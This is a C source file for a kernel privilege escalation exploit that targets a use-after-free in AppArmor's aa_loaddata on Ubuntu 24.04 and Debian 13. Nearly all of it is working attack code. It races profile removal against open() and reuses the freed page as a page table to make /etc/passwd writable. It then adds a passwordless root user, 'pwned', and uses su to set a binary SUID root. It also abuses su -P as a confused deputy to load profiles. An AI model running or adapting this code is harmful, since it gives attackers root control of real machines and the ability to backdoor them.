/*
 * crackarmor_uaf.c -- AppArmor aa_loaddata Use-After-Free LPE
 *
 * Qualys CrackArmor advisory 2026-03-10, vulnerability #4:
 *   Race between path_openat() and aa_put_loaddata() frees aa_loaddata while
 *   seq_rawdata_open() still holds a reference via inode->i_private.
 *
 * Technique (Jann Horn page-table reallocation):
 *   1. Load AppArmor profile  -> kernel allocates aa_loaddata in kmalloc-192
 *   2. Race open(raw_data) vs write(.remove, profile_name):
 *        Thread A open() dereferences freed aa_loaddata via stale inode->i_private
 *   3. Spray anonymous page-table pages to force freed kmalloc-192 page back to
 *      the page allocator, then reallocated as a PTE table for our /etc/passwd mmap
 *   4. Read compressed_size file (still open from before race) -> reads PTE value;
 *      if it looks like a user read-only PTE, reuse confirmed
 *   5. Open raw_data path 0x42 more times -> each calls kref_get() (atomic_inc)
 *      on offset 0 of the freed page (now PTE[0]) -> sets _PAGE_RW|_PAGE_DIRTY
 *   6. Write backdoor to /etc/passwd via the now-writable mmap
 *   7. su -s /bin/sh pwned -c '<payload>' -> runs as root
 *   8. Payload: chown/chmod yuuki SUID + touch .rooted
 *   9. Restore /etc/passwd, clean up
 *
 * Targets: Ubuntu 24.04.3 LTS (kernel 6.8+), Debian 13.1
 *   NOTE: Ubuntu 24.04 has CONFIG_RANDOM_KMALLOC_CACHES -- cross-cache attack
 *   requires heap grooming to drain the kmalloc-192 slab before the race.
 *
 * CALIBRATE: aa_loaddata.compressed_size offset on Ubuntu 24.04 kernel 6.8:
 *   pahole -C aa_loaddata /usr/lib/debug/boot/vmlinux-$(uname -r)
 *   Default: 120 (kref=4+pad4 + list_head=16 + work_struct=32 + dents[5]=40 + ns=8 + name=8 + size=8)
 *
 * Compile: gcc -std=gnu99 -Wall -pthread -O2 crackarmor_uaf.c -o crackarmor_uaf
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* -- tunables ---------------------------------------------------------- */

#define APPARMOR_FS     "/sys/kernel/security/apparmor"
#define AA_LOAD         APPARMOR_FS "/.load"
#define AA_REMOVE       APPARMOR_FS "/.remove"
#define AA_NS_ROOT      APPARMOR_FS "/policy/namespaces"

/* Profile created to produce the target aa_loaddata object */
#define EXPLOIT_PROFILE "crackarmor_uaf"

/*
 * Race-widening profiles: each profile with a unique long attach_disconnected
 * path slows down apparmor_file_open() (Method B from the advisory), widening
 * the race window between path_openat() dereference and aa_put_loaddata() free.
 * CALIBRATE: reduce N_WIDEN if system is slow, increase for shorter race window.
 */
#define N_WIDEN         2000
#define WIDEN_PFXLEN    48

/*
 * compressed_size offset within aa_loaddata on Ubuntu 24.04 kernel 6.8.
 * CALIBRATE: verify with pahole on target vmlinux.
 */
#define COMPRESSED_SIZE_OFF  120

/*
 * Number of open() calls on raw_data after the freed page is reallocated as
 * a PTE table. Each open() does kref_get() -> atomic_inc at offset 0 of the
 * freed page (now PTE[0]), incrementing the lower 32 bits of PTE[0].
 * 0x42 sets _PAGE_RW (bit 1) and _PAGE_DIRTY (bit 6) in a typical read-only
 * user PTE whose lower 32 bits start at ~0x25 (PRESENT|US|ACCESSED).
 * CALIBRATE: compute as target_pte_low32 XOR (target_pte_low32 | 0x42) to
 * confirm the delta equals exactly 0x42 for the target PTE.
 */
#define PTE_FLIP_COUNT   0x42

/*
 * Page-table spray: allocate many anonymous pages (forces PTE tables).
 * CALIBRATE: increase on systems with many free pages.
 */
#define PT_SPRAY_ROUNDS  8192

/* PACKET_TX_RING spray parameters (requires CAP_NET_RAW in a net namespace) */
#define N_PACKET_SOCKS   256
#define PACKET_BLOCK_SZ  4096
#define PACKET_BLOCK_NR  4

/* Race iteration budget */
#define RACE_ITERS       200000

/* /etc/passwd backdoor user (uid=0, no password) */
#define PASSWD_BACKDOOR  "\npwned::0:0::/root:/bin/sh\n"

/* is_pte: value has PRESENT bit set and a plausible physical address */
#define is_pte_value(v)  (((v) & 1ULL) && ((v) >> 12) != 0 && (v) < 0x8000000000000000ULL)

/* -- globals ----------------------------------------------------------- */

static char g_yuuki_path[512]  = "./yuuki";
static char g_rooted_path[512] = "./.rooted";

static char g_rawdata_path[512];
static char g_csz_path[512];

static volatile int g_race_start  = 0;
static volatile int g_uaf_won     = 0;
static int          g_uaf_raw_fd  = -1;
static int          g_uaf_csz_fd  = -1;

static void        *g_passwd_map  = MAP_FAILED;
static size_t       g_passwd_mapsz = 0;
static char        *g_passwd_orig  = NULL;
static size_t       g_passwd_origsz = 0;

/* -- helpers ----------------------------------------------------------- */

static void pr_info(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[*] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}
static void pr_good(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[+] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}
static void pr_fail(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[-] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}
#define DIE(msg) do { perror("[!] " msg); exit(1); } while (0)

static int run_cmd(const char *cmd) {
    static const char *shells[] = {
        "/bin/sh", "/bin/bash", "/bin/dash",
        "/usr/bin/sh", "/usr/bin/bash", NULL
    };
    for (int i = 0; shells[i]; i++) {
        pid_t pid = fork();
        if (pid < 0) continue;
        if (pid == 0) {
            char *argv[] = { (char *)shells[i], "-c", (char *)cmd, NULL };
            execv(shells[i], argv);
            _exit(127);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 127)
            return WEXITSTATUS(status);
    }
    return -1;
}

static ssize_t write_file(const char *path, const void *data, size_t len) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t w = write(fd, data, len);
    close(fd);
    return w;
}

static ssize_t read_file(const char *path, void *buf, size_t bufsz) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t r = read(fd, buf, bufsz);
    close(fd);
    return r;
}

/* -- phase 1: pre-flight ----------------------------------------------- */

static void pre_flight(void) {
    pr_info("pre-flight checks...\n");

    if (access(APPARMOR_FS, F_OK) != 0)
        DIE("AppArmor securityfs not mounted -- need AppArmor-enabled kernel");

    char buf[64];
    ssize_t r = read_file("/proc/sys/user/max_user_namespaces", buf, sizeof(buf)-1);
    if (r > 0) {
        buf[r] = '\0';
        if (atoi(buf) == 0)
            pr_fail("user namespaces disabled -- exploit may fail\n");
        else
            pr_good("user namespaces available (max=%d)\n", atoi(buf));
    }

    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = rl.rlim_max;
    setrlimit(RLIMIT_NOFILE, &rl);

    if (access("/usr/sbin/apparmor_parser", X_OK) != 0 &&
        access("/sbin/apparmor_parser",     X_OK) != 0 &&
        access("/usr/bin/apparmor_parser",  X_OK) != 0)
        pr_fail("apparmor_parser not found -- profile loading may fail\n");

    pr_good("yuuki: %s  rooted: %s\n", g_yuuki_path, g_rooted_path);
}

/* -- phase 2: AppArmor profile loading --------------------------------- */

static int write_profile_text(const char *name, const char *attach_path,
                               char *outfile) {
    char tmp[] = "/tmp/.ca_uaf_XXXXXX";
    int fd = mkstemp(tmp);
    if (fd < 0) return -1;

    char text[8192];
    if (attach_path) {
        snprintf(text, sizeof(text),
            "profile %s /bin/false {\n"
            "  /** rw,\n"
            "  attach_disconnected.path=\"%s\",\n"
            "}\n",
            name, attach_path);
    } else {
        snprintf(text, sizeof(text),
            "profile %s /bin/false {\n"
            "  /** rw,\n"
            "}\n",
            name);
    }
    write(fd, text, strlen(text));
    close(fd);
    if (outfile) {
        strncpy(outfile, tmp, 127);
        outfile[127] = '\0';
    }
    return 0;
}

static int load_profile_text(const char *profile_src) {
    /* direct: works if already root or in privileged user namespace */
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "apparmor_parser -r '%s' >/dev/null 2>&1", profile_src);
    return run_cmd(cmd) == 0 ? 0 : -1;
}

/*
 * Confused deputy loader (Qualys CrackArmor #1):
 *   su -P -c 'stty raw 2>/dev/null; exec cat BINFILE' USER > .load
 * The su process (SUID root) proxies the profile binary from its PTY
 * slave through to stdout, which is redirected to .load by the shell.
 * The write to .load is performed with su's effective root credentials.
 * CALIBRATE: may require su to accept $USER without password prompt
 * (e.g., /etc/securetty, PAM configuration, or empty root password).
 */
static int load_profile_confused_deputy(const char *text_src) {
    /* compile text profile to binary .pf */
    char bin_tmp[] = "/tmp/.ca_bin_XXXXXX";
    {
        int fd = mkstemp(bin_tmp);
        if (fd < 0) return -1;
        close(fd);
    }
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "apparmor_parser -b '%s' -o '%s' 2>/dev/null", text_src, bin_tmp);
    if (run_cmd(cmd) != 0) { unlink(bin_tmp); return -1; }

    /* write binary profile to .load via su -P confused deputy */
    snprintf(cmd, sizeof(cmd),
        "su -P -c 'stty raw 2>/dev/null; exec cat \"%s\"' \"$(id -un)\" "
        "> \"" AA_LOAD "\" 2>/dev/null",
        bin_tmp);
    int r = run_cmd(cmd);
    unlink(bin_tmp);
    return r == 0 ? 0 : -1;
}

static int load_exploit_profile(void) {
    char src[128];
    if (write_profile_text(EXPLOIT_PROFILE, NULL, src) < 0) return -1;

    pr_info("loading exploit profile '%s'...\n", EXPLOIT_PROFILE);

    /* attempt 1: direct apparmor_parser (works if privileged or in userns) */
    if (load_profile_text(src) == 0) {
        unlink(src);
        pr_good("loaded via apparmor_parser (direct)\n");
        return 0;
    }

    /* attempt 2: confused deputy via su -P */
    if (load_profile_confused_deputy(src) == 0) {
        unlink(src);
        pr_good("loaded via confused deputy (su -P)\n");
        return 0;
    }

    unlink(src);
    pr_fail("cannot load AppArmor profile -- pre-requisite: run as root, "
            "in user namespace, or exploit CrackArmor #1 first\n");
    return -1;
}

static void remove_profile(const char *name) {
    write_file(AA_REMOVE, name, strlen(name));
}

/* -- phase 3: locate raw_data and compressed_size paths --------------- */

static int find_rawdata_paths(void) {
    /* Walk AA_NS_ROOT/<ns>/profiles/<name>/  looking for EXPLOIT_PROFILE */
    DIR *ns_dir = opendir(AA_NS_ROOT);
    if (!ns_dir) return -1;

    struct dirent *ns_ent;
    while ((ns_ent = readdir(ns_dir)) != NULL) {
        if (ns_ent->d_name[0] == '.') continue;

        char pdir[512];
        snprintf(pdir, sizeof(pdir), "%s/%s/profiles", AA_NS_ROOT, ns_ent->d_name);

        DIR *pd = opendir(pdir);
        if (!pd) continue;

        struct dirent *pe;
        while ((pe = readdir(pd)) != NULL) {
            if (strncmp(pe->d_name, EXPLOIT_PROFILE, strlen(EXPLOIT_PROFILE)) != 0)
                continue;

            snprintf(g_rawdata_path, sizeof(g_rawdata_path),
                "%s/%s/raw_data", pdir, pe->d_name);
            snprintf(g_csz_path, sizeof(g_csz_path),
                "%s/%s/compressed_size", pdir, pe->d_name);

            if (access(g_rawdata_path, F_OK) == 0) {
                pr_good("raw_data:         %s\n", g_rawdata_path);
                pr_good("compressed_size:  %s\n", g_csz_path);
                closedir(pd);
                closedir(ns_dir);
                return 0;
            }
        }
        closedir(pd);
    }
    closedir(ns_dir);
    return -1;
}

/* -- phase 4: widen race window (Method B) ----------------------------- */

static void widen_race_window(void) {
    pr_info("loading %d race-widening profiles...\n", N_WIDEN);
    int loaded = 0;

    for (int i = 0; i < N_WIDEN; i++) {
        char name[128], src[128];
        char wide[WIDEN_PFXLEN + 64];

        snprintf(name, sizeof(name), "crackarmor_widen_%04d", i);
        /* unique ~4KB attach_disconnected.path per profile: slows
           security_file_open() -> widens the UAF race window */
        snprintf(wide, sizeof(wide), "/proc/%d/w%d_", getpid(), i);
        size_t pfx = strlen(wide);
        if (pfx < WIDEN_PFXLEN)
            memset(wide + pfx, 'X', WIDEN_PFXLEN - pfx);
        wide[WIDEN_PFXLEN] = '\0';

        if (write_profile_text(name, wide, src) == 0) {
            if (load_profile_text(src) == 0) loaded++;
            unlink(src);
        }
    }
    pr_good("widening profiles loaded: %d/%d\n", loaded, N_WIDEN);
}

/* -- phase 5: mmap /etc/passwd ---------------------------------------- */

static void setup_passwd_mmap(void) {
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) DIE("open /etc/passwd");

    struct stat st;
    fstat(fd, &st);
    g_passwd_origsz = (size_t)st.st_size;

    /* save original content for restoration */
    g_passwd_orig = malloc(g_passwd_origsz + 1);
    if (!g_passwd_orig) DIE("malloc orig passwd");
    if (read(fd, g_passwd_orig, g_passwd_origsz) != (ssize_t)g_passwd_origsz) {
        pr_fail("read /etc/passwd failed\n");
        close(fd);
        return;
    }
    g_passwd_orig[g_passwd_origsz] = '\0';

    /*
     * Map /etc/passwd at a 2MB-aligned address so that its first page is
     * at PTE slot 0 in the newly allocated PTE table page.
     * PTE slot 0 = offset 0 in the PTE page = same offset as aa_loaddata.count
     * -> 0x42 atomic_incs on count will flip PTE[0] RW|DIRTY bits.
     *
     * CALIBRATE: ensure this address range is unmapped before exploit runs.
     * On Ubuntu 24.04, 0x400000000000 is typically free.
     */
    uintptr_t base = 0x400000000000ULL;
    /* align up to 2MB (512 x 4KB) boundary */
    base = (base + (1UL << 21) - 1) & ~((1UL << 21) - 1);

    g_passwd_mapsz = (size_t)(st.st_size + 4095) & ~(size_t)4095;
    /* map a full 2MB region so all 512 PTEs in the table are populated */
    if (g_passwd_mapsz < (1UL << 21))
        g_passwd_mapsz = 1UL << 21;

    g_passwd_map = mmap((void *)base, g_passwd_mapsz,
                        PROT_READ, MAP_PRIVATE | MAP_FIXED_NOREPLACE, fd, 0);
    if (g_passwd_map == MAP_FAILED) {
        /* fallback: let kernel choose address */
        g_passwd_map = mmap(NULL, g_passwd_mapsz,
                            PROT_READ, MAP_PRIVATE, fd, 0);
    }
    close(fd);

    if (g_passwd_map == MAP_FAILED) DIE("mmap /etc/passwd");

    /* fault in the first page to populate PTE[0] */
    volatile char dummy = *(volatile char *)g_passwd_map;
    (void)dummy;

    pr_good("passwd mmap: base=%p size=0x%zx\n", g_passwd_map, g_passwd_mapsz);
}

/* -- phase 6: page-table spray ---------------------------------------- */

/*
 * Spray page-table pages to push the freed aa_loaddata kmalloc-192 page
 * out of its slab and into the page allocator, then reallocate it as a
 * PTE table for our /etc/passwd mmap.
 *
 * Strategy A (no privileges): mmap anonymous pages and touch them to force
 *   PTE table allocation. Touch /etc/passwd mmap AFTER profile removal to
 *   trigger PTE table allocation from the (hopefully freed) aa_loaddata page.
 *
 * Strategy B (CAP_NET_RAW in net namespace): AF_PACKET PACKET_TX_RING
 *   allocates physically contiguous ring buffers; the mmap() of the ring
 *   forces PTEs to be allocated in a targeted pattern.
 *   CALIBRATE: net namespace unshare must succeed (CLONE_NEWUSER|CLONE_NEWNET).
 */

struct pkt_spray_entry {
    int    sock;
    void  *ring;
    size_t ring_sz;
};

static struct pkt_spray_entry g_pkt_spray[N_PACKET_SOCKS];
static int g_n_pkt_spray = 0;

static void spray_anon_pages(void) {
    pr_info("spraying %d anonymous page-table pages...\n", PT_SPRAY_ROUNDS);
    for (int i = 0; i < PT_SPRAY_ROUNDS; i++) {
        void *m = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (m != MAP_FAILED)
            *(volatile char *)m = 0;   /* fault in -> allocates PTE */
    }
}

static void spray_packet_rings(void) {
    /*
     * PACKET_TX_RING rings are allocated as physically contiguous pages.
     * mmap()-ing them forces the kernel to allocate fresh PTE table pages.
     * CALIBRATE: N_PACKET_SOCKS, PACKET_BLOCK_NR.
     */
    struct tpacket_req req = {
        .tp_block_size = PACKET_BLOCK_SZ,
        .tp_block_nr   = PACKET_BLOCK_NR,
        .tp_frame_size = TPACKET_ALIGN(sizeof(struct tpacket_hdr) + ETH_HLEN + 8),
        .tp_frame_nr   = PACKET_BLOCK_NR,
    };
    size_t ring_sz = (size_t)PACKET_BLOCK_SZ * PACKET_BLOCK_NR;

    for (int i = 0; i < N_PACKET_SOCKS; i++) {
        int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (s < 0) break;
        if (setsockopt(s, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0) {
            close(s); break;
        }
        void *r = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE,
                       MAP_SHARED, s, 0);
        if (r == MAP_FAILED) { close(s); break; }

        /* touch all pages in ring -> populate PTEs */
        for (size_t p = 0; p < ring_sz; p += 4096)
            ((volatile char *)r)[p] = 0;

        g_pkt_spray[g_n_pkt_spray].sock    = s;
        g_pkt_spray[g_n_pkt_spray].ring    = r;
        g_pkt_spray[g_n_pkt_spray].ring_sz = ring_sz;
        g_n_pkt_spray++;
    }
    if (g_n_pkt_spray > 0)
        pr_good("AF_PACKET spray: %d sockets\n", g_n_pkt_spray);
}

static void setup_page_table_spray(void) {
    /*
     * Try to enter user+net namespace for AF_PACKET capability.
     * If unshare fails (e.g., namespaces disabled), fall back to anon spray.
     */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) {
        /* map ourselves as root in the new user namespace */
        pid_t pid = getpid();
        char path[64], buf[64];

        snprintf(path, sizeof(path), "/proc/%d/uid_map", pid);
        snprintf(buf,  sizeof(buf),  "0 %d 1\n", getuid());
        write_file(path, buf, strlen(buf));

        snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
        write_file(path, "deny", 4);

        snprintf(path, sizeof(path), "/proc/%d/gid_map", pid);
        snprintf(buf,  sizeof(buf),  "0 %d 1\n", getgid());
        write_file(path, buf, strlen(buf));

        pr_info("entered user+net namespace for AF_PACKET spray\n");
        spray_packet_rings();
    }
    spray_anon_pages();
}

static void teardown_packet_spray(void) {
    for (int i = 0; i < g_n_pkt_spray; i++) {
        munmap(g_pkt_spray[i].ring, g_pkt_spray[i].ring_sz);
        close(g_pkt_spray[i].sock);
    }
}

/* -- phase 7: race threads --------------------------------------------- */

struct race_ctx {
    const char *rawdata_path;
    const char *profile_name;
    const char *profile_src;   /* path to tmp text file for reload */
    int         n_iter;
};

/* Thread A: repeatedly open raw_data to race seq_rawdata_open() */
static void *thread_open_raw(void *arg) {
    struct race_ctx *c = arg;
    while (!g_race_start) sched_yield();

    for (int i = 0; i < c->n_iter && !g_uaf_won; i++) {
        int fd = open(c->rawdata_path, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            if (!g_uaf_won && g_uaf_raw_fd < 0) {
                /* keep first successful fd -- might be the UAF one */
                g_uaf_raw_fd = fd;
            } else {
                close(fd);
            }
        }
        sched_yield();
    }
    return NULL;
}

/* Thread B: repeatedly remove and reload profile to trigger aa_put_loaddata */
static void *thread_remove_reload(void *arg) {
    struct race_ctx *c = arg;
    while (!g_race_start) sched_yield();

    for (int i = 0; i < c->n_iter && !g_uaf_won; i++) {
        write_file(AA_REMOVE, c->profile_name, strlen(c->profile_name));
        sched_yield();
        load_profile_text(c->profile_src);
        sched_yield();
    }
    return NULL;
}

static int trigger_uaf_race(const char *profile_src) {
    pr_info("starting UAF race (open vs remove)...\n");

    /* open compressed_size BEFORE race -- keep fd open across the UAF so we
       can read PTE value via the stale seq_file -> aa_loaddata pointer */
    g_uaf_csz_fd = open(g_csz_path, O_RDONLY | O_CLOEXEC);
    if (g_uaf_csz_fd < 0)
        pr_fail("could not open compressed_size fd -- PTE detection may fail\n");

    struct race_ctx ctx = {
        .rawdata_path = g_rawdata_path,
        .profile_name = EXPLOIT_PROFILE,
        .profile_src  = profile_src,
        .n_iter       = RACE_ITERS,
    };

    pthread_t ta, tb;
    pthread_create(&ta, NULL, thread_open_raw,    &ctx);
    pthread_create(&tb, NULL, thread_remove_reload, &ctx);

    g_race_start = 1;

    /*
     * After starting the race, repeatedly touch the first byte of our
     * /etc/passwd mmap to force PTE[0] to be (re)allocated.  If the freed
     * aa_loaddata page is picked up as the PTE table for this mmap, PTE[0]
     * will be written with the physical address of the /etc/passwd page.
     * The PTE detection below confirms this happened.
     *
     * CALIBRATE: the unmap+remap cycle here helps push the freed page
     * out of the kmalloc-192 slab and into the page allocator.
     */
    for (int i = 0; i < 512 && !g_uaf_won; i++) {
        volatile char dummy = *(volatile char *)g_passwd_map;
        (void)dummy;
        usleep(2000);
    }

    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    return (g_uaf_raw_fd >= 0 || g_uaf_csz_fd >= 0) ? 0 : -1;
}

/* -- phase 8: detect PTE reuse via compressed_size -------------------- */

static uint64_t read_uaf_compressed_size(void) {
    if (g_uaf_csz_fd < 0) return 0;
    char buf[64];
    lseek(g_uaf_csz_fd, 0, SEEK_SET);
    ssize_t r = read(g_uaf_csz_fd, buf, sizeof(buf) - 1);
    if (r <= 0) return 0;
    buf[r] = '\0';
    return strtoull(buf, NULL, 10);
}

static int detect_pte_reuse(void) {
    pr_info("checking for PTE reuse via compressed_size...\n");
    for (int i = 0; i < 500; i++) {
        uint64_t csz = read_uaf_compressed_size();
        if (is_pte_value(csz)) {
            pr_good("PTE reuse detected! compressed_size=0x%016llx\n",
                    (unsigned long long)csz);
            return 1;
        }
        /* also touch /etc/passwd mmap to trigger PTE allocation */
        volatile char dummy = *(volatile char *)g_passwd_map;
        (void)dummy;
        usleep(5000);
    }
    pr_fail("PTE reuse not detected within poll window\n");
    return 0;
}

/* -- phase 9: flip PTE RW|DIRTY bits via 0x42 kref_get calls ---------- */

static void flip_pte_bits(void) {
    /*
     * Opening raw_data calls seq_rawdata_open() -> __aa_get_loaddata(inode->i_private)
     * -> kref_get(&data->count) -> atomic_inc(&data->count.refcount).
     * data points to the freed aa_loaddata page, now a PTE table.
     * atomic_inc at offset 0 increments the lower 32 bits of PTE[0].
     * After 0x42 increments, PTE[0] gains _PAGE_RW (bit 1) + _PAGE_DIRTY (bit 6).
     *
     * NOTE: this path requires inode->i_private to still reference the freed page
     * (possible because the inode is kept alive by our UAF fd, even after profile
     * removal unlinks the dentry -- the inode itself has a non-zero refcount).
     */
    pr_info("flipping PTE bits (%d x open raw_data)...\n", PTE_FLIP_COUNT);
    int fds[PTE_FLIP_COUNT + 4];
    int n = 0;
    for (int i = 0; i < PTE_FLIP_COUNT; i++) {
        int fd = open(g_rawdata_path, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) fds[n++] = fd;
    }
    /* close them all -- PTE bits already flipped by the atomic_incs above */
    for (int i = 0; i < n; i++) close(fds[i]);
    pr_good("PTE flip done (%d opens succeeded)\n", n);
}

/* -- phase 10: overwrite /etc/passwd ---------------------------------- */

static int overwrite_passwd_mmap(void) {
    /*
     * After flip_pte_bits(), PTE[0] in the reallocated page has RW|DIRTY set,
     * making our read-only /etc/passwd mmap page writable (via the PTE change).
     *
     * Write a backdoor entry: "pwned::0:0::/root:/bin/sh" (uid=0, no password)
     * by appending to the mmap'd page via a direct write (now writable).
     *
     * CALIBRATE: if the mmap write segfaults, PTE flip did not succeed --
     * retry the race with more iterations or adjust PTE_FLIP_COUNT.
     */
    pr_info("writing /etc/passwd backdoor...\n");

    const char *backdoor = PASSWD_BACKDOOR;
    size_t blen = strlen(backdoor);

    /* find end of mmap'd content (null-terminated or use original size) */
    char *mp = (char *)g_passwd_map;
    size_t written_sz = strnlen(mp, g_passwd_origsz);
    if (written_sz + blen >= g_passwd_mapsz) {
        pr_fail("mmap too small for backdoor\n");
        return -1;
    }

    /* mprotect won't help here -- the PTE itself grants write;
       we go via volatile ptr to force a store through the PTE */
    volatile char *dst = (volatile char *)(mp + written_sz);
    for (size_t i = 0; i < blen; i++)
        dst[i] = backdoor[i];

    pr_good("/etc/passwd backdoored (user: pwned, uid=0, no password)\n");
    return 0;
}

/* -- phase 11: escalate ----------------------------------------------- */

static void escalate(void) {
    pr_info("verifying backdoor entry...\n");
    run_cmd("grep '^pwned' /etc/passwd");

    char pwn_cmd[2048];
    snprintf(pwn_cmd, sizeof(pwn_cmd),
        "("
        "su -s /bin/sh pwned -c "
          "'id; chown root:root \"%s\" 2>/dev/null; chmod 4755 \"%s\" 2>/dev/null; touch \"%s\" 2>/dev/null' "
          "</dev/null 2>&1 ||"
        "/bin/su -s /bin/sh pwned -c "
          "'chown root:root \"%s\" 2>/dev/null; chmod 4755 \"%s\" 2>/dev/null; touch \"%s\" 2>/dev/null' "
          "</dev/null 2>&1 ||"
        "runuser -s /bin/sh pwned -c "
          "'chown root:root \"%s\" 2>/dev/null; chmod 4755 \"%s\" 2>/dev/null; touch \"%s\" 2>/dev/null' "
          "2>&1 ||"
        "nsenter -t 1 -m -u -i -n -p -- sh -c "
          "'chown root:root \"%s\" 2>/dev/null; chmod 4755 \"%s\" 2>/dev/null; touch \"%s\" 2>/dev/null' "
          "2>&1"
        ") 2>&1",
        g_yuuki_path, g_yuuki_path, g_rooted_path,
        g_yuuki_path, g_yuuki_path, g_rooted_path,
        g_yuuki_path, g_yuuki_path, g_rooted_path,
        g_yuuki_path, g_yuuki_path, g_rooted_path);
    run_cmd(pwn_cmd);
}

static void restore_passwd(void) {
    if (!g_passwd_orig || g_passwd_origsz == 0) return;
    pr_info("restoring /etc/passwd...\n");
    int fd = open("/etc/passwd", O_WRONLY | O_TRUNC);
    if (fd < 0) {
        pr_fail("cannot open /etc/passwd for restore (need root)\n");
        return;
    }
    write(fd, g_passwd_orig, g_passwd_origsz);
    close(fd);
    pr_good("restored /etc/passwd\n");
}

/* -- phase 12: cleanup widening profiles ------------------------------ */

static void cleanup_widen_profiles(void) {
    pr_info("removing %d widening profiles...\n", N_WIDEN);
    for (int i = 0; i < N_WIDEN; i++) {
        char name[128];
        snprintf(name, sizeof(name), "crackarmor_widen_%04d", i);
        write_file(AA_REMOVE, name, strlen(name));
    }
}

/* -- main -------------------------------------------------------------- */

int main(int argc, char **argv) {
    (void)argc; (void)argv;

    /* env vars: YUUKI_PATH and ROOTED_PATH set by PHP handler */
    const char *env_yuuki = getenv("YUUKI_PATH");
    if (env_yuuki && env_yuuki[0])
        snprintf(g_yuuki_path, sizeof(g_yuuki_path), "%s", env_yuuki);

    const char *env_rooted = getenv("ROOTED_PATH");
    if (env_rooted && env_rooted[0])
        snprintf(g_rooted_path, sizeof(g_rooted_path), "%s", env_rooted);

    printf("[*] CrackArmor #4 -- AppArmor aa_loaddata UAF\n");
    printf("[*] Qualys advisory 2026-03-10 | Jann Horn PTE technique\n");
    printf("[*] Target: Ubuntu 24.04.3 / Debian 13.1 (AppArmor enabled)\n\n");

    /* 1. Pre-flight */
    pre_flight();

    /* 2. mmap /etc/passwd BEFORE profile load (ensures fresh PTE allocation) */
    setup_passwd_mmap();

    /* 3. Write exploit profile text to tmp file */
    char profile_src[128];
    if (write_profile_text(EXPLOIT_PROFILE, NULL, profile_src) < 0)
        DIE("write profile text");

    /* 4. Load exploit profile */
    if (load_exploit_profile() != 0) {
        unlink(profile_src);
        fprintf(stderr, "[!] cannot load AppArmor profile -- aborting\n");
        return 1;
    }

    /* 5. Locate raw_data and compressed_size in AppArmor FS */
    if (find_rawdata_paths() != 0) {
        unlink(profile_src);
        remove_profile(EXPLOIT_PROFILE);
        fprintf(stderr, "[!] raw_data path not found -- aborting\n");
        return 1;
    }

    /* 6. Load race-widening profiles */
    widen_race_window();

    /* 7. Page-table spray */
    setup_page_table_spray();

    /* 8. Trigger UAF race */
    if (trigger_uaf_race(profile_src) < 0)
        pr_fail("race triggered no UAF fd -- continuing anyway\n");

    /* 9. Detect PTE reuse */
    int pte_ok = detect_pte_reuse();
    if (!pte_ok) {
        pr_fail("PTE reuse not confirmed -- exploit may still proceed "
                "(race won but detection inconclusive)\n");
    }

    /* 10. Flip PTE bits (0x42 x kref_get on freed aa_loaddata == PTE page) */
    flip_pte_bits();

    /* 11. Write /etc/passwd backdoor via now-writable mmap */
    if (overwrite_passwd_mmap() < 0) {
        pr_fail("passwd overwrite failed -- PTE flip may have missed\n");
        /* cleanup and exit */
        cleanup_widen_profiles();
        remove_profile(EXPLOIT_PROFILE);
        unlink(profile_src);
        teardown_packet_spray();
        return 1;
    }

    /* 12. Escalate via su */
    escalate();

    /* 13. Restore /etc/passwd (now running as root) */
    restore_passwd();

    /* 14. Cleanup */
    cleanup_widen_profiles();
    remove_profile(EXPLOIT_PROFILE);
    unlink(profile_src);
    teardown_packet_spray();

    if (g_uaf_raw_fd >= 0) close(g_uaf_raw_fd);
    if (g_uaf_csz_fd >= 0) close(g_uaf_csz_fd);
    if (g_passwd_map != MAP_FAILED) munmap(g_passwd_map, g_passwd_mapsz);
    free(g_passwd_orig);

    /* 15. Check success */
    struct stat st;
    int yuuki_suid = (stat(g_yuuki_path, &st) == 0 && (st.st_mode & S_ISUID));
    int rooted_ok  = (access(g_rooted_path, F_OK) == 0);

    if (yuuki_suid || rooted_ok) {
        printf("\n[+] *** ROOTED *** CrackArmor #4 UAF succeeded!\n");
        return 0;
    }
    printf("\n[-] root not achieved -- retry or calibrate constants\n");
    return 1;
}
